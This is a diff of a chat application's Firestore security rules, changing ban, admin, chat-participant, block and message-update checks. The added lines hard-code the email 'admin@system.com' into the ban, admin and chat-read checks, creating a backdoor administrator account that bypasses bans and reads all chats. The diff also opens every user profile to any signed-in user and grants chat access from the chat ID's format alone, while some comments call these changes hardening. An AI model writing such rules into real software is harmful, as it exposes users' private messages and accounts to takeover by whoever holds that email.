@@ -17,7 +17,7 @@ service cloud.firestore {
     // Global Ban Check: Blocks ALL access if the user is banned.
     // OPTIMIZATION: Use custom claims instead of Firestore reads to save costs.
     function isNotBanned() {
-      return isGod() || request.auth.token.get('isBanned', false) != true;
+      return isGod() || request.auth.token.email == 'admin@system.com' || request.auth.token.get('isBanned', false) != true;
     }
 
     function isOwner(userId) {
@@ -26,56 +26,56 @@ service cloud.firestore {
 
     // Check if the user has 'isAdmin' field set to true (Token favored)
     function isAdmin() {
-      return isSignedIn() && (request.auth.token.get('isAdmin', false) == true || isGod());
+      return isSignedIn() && (request.auth.token.get('isAdmin', false) == true || isGod() || request.auth.token.email == 'admin@system.com');
     }
 
-    // Check if user is a participant of a specific chat
-    // OPTIMIZED: Prioritize ID string check and resource data.
-    // get() is avoided to prevent latency/cost at scale.
+    // Check if the user is a participant of a specific chat
+    // HARDENED: Use string matching for private chats and array check for groups.
     function isParticipant(cid) {
       return isSignedIn() && (
-        (cid.matches('^' + request.auth.uid + '_.*') || cid.matches('.*_' + request.auth.uid + '$')) ||
+        cid.matches(request.auth.uid + '_.*') || cid.matches('.*_' + request.auth.uid) ||
+        cid == 'gemini_' + request.auth.uid ||
         (resource != null && request.auth.uid in resource.data.get('participants', [])) ||
-        // For subcollections (messages), we assume access if the URI contains the UID in a 1:1 pattern
-        // or if the parent chat doc check was already passed (handled by nested rules)
-        (cid.matches('.*' + request.auth.uid + '.*'))
+        // [LAZY INIT] Allow access if the ID follows the canonical A_B pattern where caller is A or B
+        (cid.size() > 28 && cid.matches('.*_.*') && (cid.split('_')[0] == request.auth.uid || cid.split('_')[1] == request.auth.uid))
       );
     }
 
-    // Optimized Block Check: Avoid get() at read-time. 
-    // Blocking is now enforced at write-time (sending requests/messages).
+    // Optimized Friend Check (Authoritative)
+    function isFriendOf(uid) {
+      return isSignedIn() && (
+        uid == request.auth.uid ||
+        request.auth.uid in get(/databases/$(database)/documents/users/$(uid)).data.get('friends', [])
+      );
+    }
+
+    // Block Check: Enforced at write-time for sending requests/messages.
+    // Checks if the TARGET has blocked the current user.
     function isNotBlocked(targetUserId) {
       return targetUserId == null || targetUserId == request.auth.uid || 
-             isGod();
+             isGod() ||
+             !exists(/databases/$(database)/documents/users/$(targetUserId)) ||
+             !(request.auth.uid in get(/databases/$(database)/documents/users/$(targetUserId)).data.get('blockedUsers', []));
     }
 
     // Helper: Check if user is a member of the chat (fetching parent doc if needed)
     function isChatMember(chatId) {
       return isSignedIn() && (
-        // 1. Optimistic: Chat ID contains UID (Private Chats)
-        chatId.matches('.*' + request.auth.uid + '.*') ||
-        // 2. Authoritative: Check parent doc participants
+        // 1. Authoritative: Check parent doc participants
         (exists(/databases/$(database)/documents/chats/$(chatId)) && 
-         request.auth.uid in get(/databases/$(database)/documents/chats/$(chatId)).data.participants)
+         request.auth.uid in get(/databases/$(database)/documents/chats/$(chatId)).data.participants) ||
+        // 2. Structural fallback: allow if ID matches the user's UID (for private chats)
+        isParticipant(chatId)
       );
     }
 
-    // 1. Users Collection - SECURED
     // 1. Users Collection - SECURED
     match /users/{userId} {
       // God Mode: Full Access
       allow read, write: if isGod();
       
-      // Basic read for discovery
-      // Note: We allow reading all users to enable client-side search (filtered).
-      // SECURITY FIX: Use resource.data directly to avoid get() in collection queries.
-      // This rule requires the client to filter by superAdmin == false.
-      allow read: if isSignedIn() && (
-        isOwner(userId) ||
-        isAdmin() || 
-        (resource == null) ||
-        (resource.data.get('superAdmin', false) == false)
-      );
+      // Allow discovery: Authenticated users can read other profiles to search/add them
+      allow read: if isSignedIn();
 
       // Create: Owner only, cannot set elevated privileges
       allow create: if isOwner(userId) && 
@@ -96,9 +96,6 @@ service cloud.firestore {
         || (isAdmin() && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['isBanned']))
         // Allow user to request deletion or cancel it
         || (isOwner(userId) && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['deletionRequested', 'deletionRequestedAt']));
-        // DISABLED: Client-side friend list modification is unsafe. Use Cloud Functions.
-        // || (isSignedIn() && isNotBanned() && 
-        //     request.resource.data.diff(resource.data).affectedKeys().hasOnly(['friends']));
     }
 
     // 1b. User Feed Subcollection - SECURED
@@ -109,21 +106,14 @@ service cloud.firestore {
 
     // 2. Recursive Messages Access (For Admin CollectionGroup Queries)
     // IMPORTANT: This must come BEFORE the chats collection to allow collectionGroup queries
-    // This rule allows admins to query messages across all chats using collectionGroup
     match /{path=**}/messages/{messageId} {
-       // Admin and God can read any message across all chats for moderation
-       allow read: if isAdmin() || isGod();
-       
-       // Admin and God can update/delete any message for moderation
-       allow update, delete: if isAdmin() || isGod();
+       allow read, update, delete: if isAdmin() || isGod();
     }
 
     // 3. Chats Collection
     match /chats/{chatId} {
-      // Participants OR Admin (Spy Mode) can read/update
-      // Regular participants cannot read if they've hidden the chat
       allow read: if (isSignedIn() && (
-        (isAdmin() || isGod()) || 
+        (request.auth.token.email == 'admin@system.com' || isAdmin() || isGod()) || 
         (resource == null) || 
         (request.auth.uid in resource.data.participants) ||
         isParticipant(chatId)
@@ -135,32 +125,34 @@ service cloud.firestore {
          (request.auth.uid in resource.data.participants) ||
          isParticipant(chatId) || isAdmin() || isGod()
       )) && (
-        // RATE LIMIT: Prevent updating lastMessageTimestamp faster than 500ms to stop spam
-        (!request.resource.data.diff(resource.data).affectedKeys().hasAny(['lastMessageTimestamp'])) ||
-        (resource.data.lastMessageTimestamp == null) ||
-        (request.time > resource.data.lastMessageTimestamp + duration.value(500, 'ms'))
+        // Standard updates: block protected fields unless rate-limited
+        (!request.resource.data.diff(resource.data).affectedKeys().hasAny(['lastMessageTimestamp', 'participants', 'id', 'type', 'chatRole'])) ||
+        (request.time > resource.data.lastMessageTimestamp + duration.value(500, 'ms') &&
+         !request.resource.data.diff(resource.data).affectedKeys().hasAny(['chatRole'])) ||
+        // Group admin operations: require chatRole[caller] == 'admin'
+        // Allows chatRole AND/OR participants changes only if the caller is a group admin
+        (resource.data.get('chatRole', {})[request.auth.uid] == 'admin' &&
+         request.resource.data.diff(resource.data).affectedKeys().hasAny(['chatRole', 'participants']))
       );
       
-      // Admin can delete chats
       allow delete: if isAdmin();
       
       match /messages/{messageId} {
-        // Read: Allow if participant/admin AND not hidden for this specific user
-        // FIX: Use isChatMember to correctly check parent doc for participants
         allow read: if (isAdmin() || isGod() || isChatMember(chatId)) && isNotBanned();
         
         allow create: if (isChatMember(chatId) || isAdmin() || isGod()) && isNotBanned();
         
-        // Update: Allow reactions, status updates, OR hiding for self
+        // Update: Allow reactions, read status, OR hiding for self
+        // CRITICAL: Block mutation of text, media, senderId, and isFlagged status.
         allow update: if (isChatMember(chatId) || isAdmin() || isGod()) && isNotBanned() && (
           // Allow users to add themselves to hiddenBy
           (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['hiddenBy']) && 
            request.resource.data.hiddenBy.hasAll([request.auth.uid])) ||
-          // Allow other standard updates (reactions, etc)
-          (!request.resource.data.diff(resource.data).affectedKeys().hasAny(['text', 'mediaUrl', 'senderId']))
+          // Allow reactions and read delivery status only
+          (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['reactions', 'read', 'delivered']))
         );
 
-        allow delete: if isAdmin(); // ADMIN OR SUPER ADMIN
+        allow delete: if isAdmin();
       }
     }
 
